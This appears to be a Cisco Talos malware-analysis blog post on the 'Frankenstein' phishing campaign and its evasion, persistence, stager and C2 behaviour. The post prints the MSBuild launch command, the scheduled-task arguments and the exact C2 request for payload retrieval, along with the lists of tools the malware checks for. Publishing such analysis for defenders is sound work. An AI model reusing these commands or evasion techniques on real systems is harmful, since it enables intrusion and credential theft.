@@ -1,0 +1,188 @@
+
+
+
+This blog was authored by Danny Adamitis, David Maynor and Kendall McKay.
+
+Executive summary
+Cisco Talos recently identified a series of documents that we believe are part of a coordinated series of cyber attacks that we are calling the "Frankenstein" campaign. We assess that the attackers carried out these operations between January and April 2019 in an effort to install malware on users' machines via malicious documents. We assess that this activity was hyper-targeted given that there was a low volume of these documents in various malware repositories. Frankenstein — the name refers to the actors' ability to piece together several unrelated components —  leveraged four different open-source techniques to build the tools used during the campaign. 
+
+The campaign used components of:
+
+
+An article to detect when your sample is being run in a VM
+
+A GitHub project that leverages MSbuild to execute a PowerShell command
+
+A component of GitHub project called "Fruityc2" to build a stager
+
+A GitHub project called "PowerShell Empire" for their agents
+
+We believe that the threat actors behind the Frankenstein campaign are moderately sophisticated and highly resourceful. The actors' preference for open-source solutions appears to be part of a broader trend in which adversaries are increasingly using publicly available solutions, possibly to improve operational security. These obfuscation techniques will require network defenders to modify their posture and procedures to detect this threat.
+
+This report outlines the various anti-detection techniques used throughout the Frankenstein campaign. Some of these techniques included checking to see if any analysis tools, such as Process Explorer, were running in the background and determining whether the sample was inside of a virtual machine. The threat actors also took additional steps to only respond to GET requests that contained predefined fields, such as a non-existent user-agent string, a session cookie, and a particular directory on the domain. The threat actors also used different types of encryption in order to protect data in transit.
+
+
+Trojanized documents
+Talos has identified two different infection vectors associated with this particular campaign. In order to compromise their victims, the threat actors sent the trojanized Microsoft Word documents, probably via email. The first vector relies on a trojanized document that fetches a remote template and then uses a known exploit. The second vector is a trojanized Word document that prompts the victim to enable macros and run a Visual Basic script. We were able to correlate these two techniques to the same threat campaign due to overlapping threat actor C2.  
+
+In the first scenario, Talos discovered a document named "MinutesofMeeting-2May19.docx", that appeared to display the national flag of Jordan. Once the victim opens the document, it fetches a remove template from the actor-controlled website, hxxp://droobox[.]online:80/luncher.doc. Once the luncher.doc was downloaded, it used CVE-2017-11882, to execute code on the victim's machine. After the exploit, the file would run a command script to set up persistence as a scheduled task named "WinUpdate". 
+
+"/Create /F /SC DAILY /ST 09:00 /TN WinUpdate /TR" That scheduled task would run a series of base64-encoded PowerShell commands that acted as a stager. The stager will be described in more detail in the next section. 
+
+
+
+Example of the MinutesofMeeting-2May19.docx.
+
+One of the samples we analyzed that prompted the victim to enable macros claimed to have "been secured by Kaspersky," a well-known anti-virus firm. While threat actors commonly create fake security labels for malicious documents, this technique could also indicate that the threat actor had performed reconnaissance on the intended victims, suggesting that the documents had been socially engineered to some degree.
+
+
+
+Example of malicious Microsoft Word document.
+
+Two other documents we associated with this group appeared to be more targeted in nature. One document contained logos that appear to be from several Middle Eastern countries' government agencies, while the other document showed an image of unspecified buildings that were possibly recognizable to a select group of targets.
+
+
+Trojanized document containing official logos.
+
+
+
+Trojanized document containing the image of unidentified buildings.
+
+
+Visual Basic script and its anti-analysis features
+As soon as the user enabled the macro, a robust Visual Basic Application (VBA) script began to execute. The VBA script contained two anti-analysis features. First, it would query Windows Management Instrumentation (WMI) to check if any of the following applications were running:
+
+
+VMWare
+
+Vbox
+
+Process Explorer
+
+Process Hacker 
+
+ProcMon
+
+Visual Basic
+
+Fiddler 
+
+WireShark
+
+Next, the script would check to see if any of the following tasks were running:
+
+
+VMWare
+
+Vbox
+
+VxStream
+
+AutoIT
+
+VMtools
+
+TCPView
+
+WireShark
+
+Process Explorer
+
+Visual Basic 
+
+Fiddler
+
+
+
+A copy of the macro's code, which checks for analysis-oriented applications.
+
+If any of the aforementioned applications or task names were discovered during the enumeration process, the script would stop execution. The next evasion technique was to call WMI and determine the number of cores allocated to the system. If the number of cores was less than two, the script would stop execution and the end user would receive a pop-up message stating "The File is not compatible with your Microsoft Office Version." We assess that this technique was modeled after a 2015 TrustedSec report as a way to detect if the sample was being run in a virtual machine or a sandbox environment.
+
+Once the evasion checks were complete, the threat actors used MSbuild to execute an actor-created file named "LOCALAPPDATA\Intel\instal.xml". Based on lexical analysis, we assess with high confidence that this component of the macro script was based on an open-source project called "MSBuild-inline-task." While this technique was previously documented last year, it has rarely been observed being used in operations. Talos suspects the adversary chose MSBuild because it is a signed Microsoft binary, meaning that it can bypass application whitelisting controls on the host when being used to execute arbitrary code. 
+
+
+
+A copy of the threat actors' version of the MSbuild-inline-task.
+
+The last line of the file would run encoded commands from the command line:
+
+cmd.exe /c C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe LOCALAPPDATA\Intel\instal.xml C:\Windows\System32
+Once the "instal.xml" file began execution, it would deobfuscate the base64-encoded commands. This revealed a stager, or a small script designed to obtain an additional payload. While analyzing this stager, we noticed some similarities to the "Get-Data" function of the FruityC2 PowerShell agent. One notable difference is that this particular stager included functionality that allowed the stager to communicate with the command and control (C2) via an encrypted RC4 byte stream. In this sample, the threat actors' C2 server was the domain msdn[.]cloud. A copy of the deobfuscated stager can be seen in the image below.
+
+
+Copy of the deobfuscated stager.
+
+When executed successfully, the stager connected to the C2. However, in order to receive the agent, the request needed to contain the correct directory, user-agent string, and session cookie. The anticipated GET request appeared as follows:
+
+GET /FC001/JOHN HTTP/1.1
+Cookie: session=drYuSCFQdbQYHozM2dku17KYkY8=
+User-Agent: Microsoft Internet Explorer
+Host: msdn[.]cloud
+Connection: Keep-Alive
+If successful, the C2 would return a string of characters. Once the string was RC4 decrypted, it launched a PowerShell Empire agent. The PowerShell script would attempt to enumerate the host to look for certain information, such as:
+
+
+Username
+
+Domain name
+
+Machine name 
+
+Public IP address 
+
+Checks if the current user has administrative privileges
+
+Obtains a list of all currently running processes
+
+Calls WMI to obtain operating system version
+
+Obtains the security system's SHA256 HMAC
+
+Once the aforementioned information was obtained, it was sent back to the threat actor's C2. Similar to the stager, the agent included functionality to communicate via an encrypted channel, in this case AES-CBC, in addition to using a specific user-agent string and a session key. This agent would allow the threat actors to remotely interact with the agent to upload and download files and to use the various plugins that were compatible with the Empire framework, such as those used to harvest credentials on the victim's machine. While this threat actor exhibited signs of sophistication, there were some small components that were overlooked. For example, it appears that the threat actor forgot to configure certain components for the Empire agent, such as leaving placeholder values for some variables like "WORKING_HOURS_REPLACE" and "REPLACE_KILLDATE".
+
+
+Conclusion
+The actors' preference for open-source solutions appears to be part of a broader trend in which adversaries are increasingly using publicly available tools, which offer them some advantages over a completely custom toolset. A campaign that leverages custom tools is more easily attributed to the tools' developers. One example of this was the code overlap in the VPNFilter malware that allowed us to associate the activity with the Blackenergy malware. By contrast, operations performed with open-source frameworks are extremely difficult to attribute without additional insights or intelligence. Over the past several years, there have been multiple instances of advanced threat actors using open-source techniques, such as MuddyWater, among others. This growing trend highlights that highly trained operators are increasingly using unsophisticated tools to accomplish their goals.
+
+
+Coverage
+Ways our customers can detect and block this threat are listed below.
+
+Advanced Malware Protection (AMP) is ideally suited to prevent the execution of the malware detailed in this post. Below is a screenshot showing how AMP can protect customers from this threat. Try AMP for free here.
+
+
+Cisco Cloud Web Security (CWS) or Web Security Appliance (WSA) web scanning prevents access to malicious websites and detects malware used in these attacks.
+
+Email Security can block malicious emails sent by threat actors as part of their campaign.
+
+Network Security appliances such as Next-Generation Firewall (NGFW), Next-Generation Intrusion Prevention System (NGIPS), and Meraki MX can detect malicious activity associated with this threat.
+
+Threat Grid helps identify malicious binaries and build protection into all Cisco Security products.
+
+Umbrella, our secure internet gateway (SIG), blocks users from connecting to malicious domains, IPs, and URLs, whether users are on or off the corporate network.
+
+Additional protections with context to your specific environment and threat data are available from the Firepower Management Center.
+
+Open Source Snort Subscriber Rule Set customers can stay up to date by downloading the latest rule pack available for purchase on Snort.org.
+
+
+Indicators of Compromise
+Hashes 
+418379fbfe7e26117a36154b1a44711928f52e33830c6a8e740b66bcbe63ec61
+50195be1de27eac67dd3e5918e1fc80acaa16159cb48b4a6ab9451247b81b649
+6b2c71bfc5d2e85140b87c801d82155cd9abd97f84c094570373a9620e81cee0
+6be18e3afeec482c79c9dea119d11d9c1598f59a260156ee54f12c4d914aed8f
+6e6e7ac84b1b0a0ae833ef2cb56592e1a7efc00ffad9b06bce7e676befc84185
+b2600ac9b83e5bb5f3d128dbb337ab1efcdc6ce404adb6678b062e95dbf10c93
+
+URLs
+hxxp://droobox[.]online/luncher.doc
+hxxp://msdn[.]cloud/FC001/JOHN
+hxxp://search-bing[.]site/FC003/User=H6szn1woY2pLV
+
+Domains
+msdn[.]cloud
+search-bing[.]site
+droobox[.]online
+
+
